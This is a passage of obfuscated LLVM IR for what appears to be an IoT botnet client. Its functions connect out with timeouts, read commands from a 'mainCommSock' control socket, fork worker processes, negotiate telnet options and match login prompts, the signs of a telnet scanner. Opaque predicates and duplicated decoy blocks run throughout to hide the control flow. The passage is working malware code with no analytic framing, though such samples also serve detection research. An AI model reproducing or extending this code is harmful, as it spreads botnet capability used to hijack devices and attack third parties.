  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %105 = load i32, i32* %5, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %5, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %113, i32* %12, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %118

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* %13, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %13, align 4
  br label %50

; <label>:118:                                    ; preds = %99
  %119 = load i32, i32* @x.39
  %120 = load i32, i32* @y.40
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %118
  %127 = load i32, i32* @x.39
  %128 = load i32, i32* @y.40
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %135

; <label>:135:                                    ; preds = %originalBBpart28, %originalBBpart2
  %136 = load i32, i32* @x.39
  %137 = load i32, i32* @y.40
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %135
  %144 = load i32, i32* @x.39
  %145 = load i32, i32* @y.40
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %152

; <label>:152:                                    ; preds = %originalBBpart212, %33
  store i32 0, i32* %18, align 4
  %153 = load i8*, i8** %6, align 8
  store i8* %153, i8** %17, align 8
  br label %154

; <label>:154:                                    ; preds = %originalBBpart225, %152
  %155 = load i32, i32* %7, align 4
  %156 = add nsw i32 %155, -1
  store i32 %156, i32* %7, align 4
  %157 = icmp sgt i32 %155, 1
  br i1 %157, label %158, label %191

; <label>:158:                                    ; preds = %154
  %159 = load i32, i32* @mainCommSock, align 4
  %160 = call i64 @recv(i32 %159, i8* %16, i64 1, i32 0)
  %161 = icmp ne i64 %160, 1
  br i1 %161, label %162, label %164

; <label>:162:                                    ; preds = %158
  %163 = load i8*, i8** %17, align 8
  store i8 0, i8* %163, align 1
  store i32 -1, i32* %4, align 4
  br label %194

; <label>:164:                                    ; preds = %158
  %165 = load i8, i8* %16, align 1
  %166 = load i8*, i8** %17, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %17, align 8
  store i8 %165, i8* %166, align 1
  %168 = load i8, i8* %16, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 10
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %164
  br label %191

; <label>:172:                                    ; preds = %164
  %173 = load i32, i32* @x.39
  %174 = load i32, i32* @y.40
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %172
  %181 = load i32, i32* %18, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %18, align 4
  %183 = load i32, i32* @x.39
  %184 = load i32, i32* @y.40
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart225, label %originalBB14alteredBB

originalBBpart225:                                ; preds = %originalBB14
  br label %154

; <label>:191:                                    ; preds = %171, %154
  %192 = load i8*, i8** %17, align 8
  store i8 0, i8* %192, align 1
  %193 = load i32, i32* %18, align 4
  store i32 %193, i32* %4, align 4
  br label %194

; <label>:194:                                    ; preds = %191, %162
  %195 = load i32, i32* %4, align 4
  ret i32 %195

originalBBalteredBB:                              ; preds = %originalBB, %50
  %196 = load i32, i32* %13, align 4
  %197 = icmp slt i32 %196, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %198 = load i32, i32* @mainCommSock, align 4
  %199 = call i32 (i32, i8*, ...) @sockprintf(i32 %198, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0))
  %200 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %200, align 8
  %201 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %201, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %118
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %135
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %172
  %202 = load i32, i32* %18, align 4
  %_ = sub i32 %202, 1
  %gen = mul i32 %_, 1
  %_15 = shl i32 %202, 1
  %_16 = sub i32 0, %202
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 0, %202
  %gen19 = add i32 %_18, 1
  %_20 = shl i32 %202, 1
  %_21 = sub i32 %202, 1
  %gen22 = mul i32 %_21, 1
  %_23 = shl i32 %202, 1
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %18, align 4
  br label %originalBB14
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %148

; <label>:37:                                     ; preds = %4
  %38 = load i32, i32* @x.41
  %39 = load i32, i32* @y.42
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = load i32, i32* %6, align 4
  %49 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %16, align 4
  %51 = load i32, i32* %16, align 4
  %52 = icmp slt i32 %51, 0
  %53 = load i32, i32* @x.41
  %54 = load i32, i32* @y.42
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %139

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = call i32* @__errno_location() #13
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, 115
  br i1 %64, label %65, label %137

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #2, !srcloc !3
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %119

; <label>:95:                                     ; preds = %79
  %96 = load i32, i32* @x.41
  %97 = load i32, i32* @y.42
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %95
  store i32 4, i32* %13, align 4
  %104 = load i32, i32* %6, align 4
  %105 = bitcast i32* %14 to i8*
  %106 = call i32 @getsockopt(i32 %104, i32 1, i32 4, i8* %105, i32* %13) #2
  %107 = load i32, i32* %14, align 4
  %108 = icmp ne i32 %107, 0
  %109 = load i32, i32* @x.41
  %110 = load i32, i32* @y.42
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %108, label %117, label %118

; <label>:117:                                    ; preds = %originalBBpart24
  store i32 0, i32* %5, align 4
  br label %148

; <label>:118:                                    ; preds = %originalBBpart24
  br label %136

; <label>:119:                                    ; preds = %79
  %120 = load i32, i32* @x.41
  %121 = load i32, i32* @y.42
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %119
  store i32 0, i32* %5, align 4
  %128 = load i32, i32* @x.41
  %129 = load i32, i32* @y.42
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %148

; <label>:136:                                    ; preds = %118
  br label %138

; <label>:137:                                    ; preds = %61
  store i32 0, i32* %5, align 4
  br label %148

; <label>:138:                                    ; preds = %136
  br label %139

; <label>:139:                                    ; preds = %138, %originalBBpart2
  %140 = load i32, i32* %6, align 4
  %141 = call i32 (i32, i32, ...) @fcntl(i32 %140, i32 3, i8* null)
  %142 = sext i32 %141 to i64
  store i64 %142, i64* %15, align 8
  %143 = load i64, i64* %15, align 8
  %144 = and i64 %143, -2049
  store i64 %144, i64* %15, align 8
  %145 = load i32, i32* %6, align 4
  %146 = load i64, i64* %15, align 8
  %147 = call i32 (i32, i32, ...) @fcntl(i32 %145, i32 4, i64 %146)
  store i32 1, i32* %5, align 4
  br label %148

; <label>:148:                                    ; preds = %139, %137, %originalBBpart28, %117, %36
  %149 = load i32, i32* %5, align 4
  ret i32 %149

originalBBalteredBB:                              ; preds = %originalBB, %37
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %151 = getelementptr inbounds [8 x i8], [8 x i8]* %150, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %151, i8 0, i64 8, i32 4, i1 false)
  %152 = load i32, i32* %6, align 4
  %153 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %154 = call i32 @connect(i32 %152, %struct.sockaddr* %153, i32 16)
  store i32 %154, i32* %16, align 4
  %155 = load i32, i32* %16, align 4
  %156 = icmp slt i32 %155, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %95
  store i32 4, i32* %13, align 4
  %157 = load i32, i32* %6, align 4
  %158 = bitcast i32* %14 to i8*
  %159 = call i32 @getsockopt(i32 %157, i32 1, i32 4, i8* %158, i32* %13) #2
  %160 = load i32, i32* %14, align 4
  %161 = icmp ne i32 %160, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %119
  store i32 0, i32* %5, align 4
  br label %originalBB6
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.45
  %5 = load i32, i32* @y.46
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.45
  %22 = load i32, i32* @y.46
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %141 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %143

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  store i8 -1, i8* %16, align 1
  %39 = load i32, i32* %13, align 4
  %40 = call i64 @send(i32 %39, i8* %16, i64 1, i32 16384)
  %41 = load i8*, i8** %14, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 1
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 252, %44
  %46 = load i32, i32* @x.45
  %47 = load i32, i32* @y.46
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart24
  store i8 -2, i8* %16, align 1
  br label %134

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i8*, i8** %14, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 1
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 254, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %55
  store i8 -4, i8* %16, align 1
  br label %133

; <label>:62:                                     ; preds = %55
  %63 = load i32, i32* @x.45
  %64 = load i32, i32* @y.46
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8*, i8** %14, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 3, %74
  %76 = load i32, i32* @x.45
  %77 = load i32, i32* @y.46
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %92

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i8*, i8** %14, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 253
  %90 = select i1 %89, i32 251, i32 253
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %16, align 1
  br label %116

; <label>:92:                                     ; preds = %originalBBpart28
  %93 = load i32, i32* @x.45
  %94 = load i32, i32* @y.46
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i8*, i8** %14, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 253
  %106 = select i1 %105, i32 252, i32 254
  %107 = trunc i32 %106 to i8
  store i8 %107, i8* %16, align 1
  %108 = load i32, i32* @x.45
  %109 = load i32, i32* @y.46
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %116

; <label>:116:                                    ; preds = %originalBBpart212, %84
  %117 = load i32, i32* @x.45
  %118 = load i32, i32* @y.46
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %116
  %125 = load i32, i32* @x.45
  %126 = load i32, i32* @y.46
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %133

; <label>:133:                                    ; preds = %originalBBpart216, %61
  br label %134

; <label>:134:                                    ; preds = %133, %54
  %135 = load i32, i32* %13, align 4
  %136 = call i64 @send(i32 %135, i8* %16, i64 1, i32 16384)
  %137 = load i32, i32* %13, align 4
  %138 = load i8*, i8** %14, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 2
  %140 = call i64 @send(i32 %137, i8* %139, i64 1, i32 16384)
  br label %142

; <label>:141:                                    ; preds = %originalBBpart2
  br label %142

; <label>:142:                                    ; preds = %141, %134
  store i32 0, i32* %12, align 4
  br label %143

; <label>:143:                                    ; preds = %142, %29
  %144 = load i32, i32* %12, align 4
  ret i32 %144

originalBBalteredBB:                              ; preds = %originalBB, %3
  %145 = alloca i32, align 4
  %146 = alloca i32, align 4
  %147 = alloca i8*, align 8
  %148 = alloca i32, align 4
  %149 = alloca i8, align 1
  store i32 %0, i32* %146, align 4
  store i8* %1, i8** %147, align 8
  store i32 %2, i32* %148, align 4
  %150 = load i8*, i8** %147, align 8
  %151 = getelementptr inbounds i8, i8* %150, i64 1
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  store i8 -1, i8* %16, align 1
  %154 = load i32, i32* %13, align 4
  %155 = call i64 @send(i32 %154, i8* %16, i64 1, i32 16384)
  %156 = load i8*, i8** %14, align 8
  %157 = getelementptr inbounds i8, i8* %156, i64 1
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 252, %159
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %161 = load i8*, i8** %14, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 1
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 3, %164
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  %166 = load i8*, i8** %14, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 253
  %171 = select i1 %170, i32 252, i32 254
  %172 = trunc i32 %171 to i8
  store i8 %172, i8* %16, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %116
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %129, %1
  %12 = load i32, i32* @x.47
  %13 = load i32, i32* @y.48
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.47
  %26 = load i32, i32* @y.48
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %132

; <label>:33:                                     ; preds = %originalBBpart2
  br label %34

; <label>:34:                                     ; preds = %106, %33
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %7, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %104

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
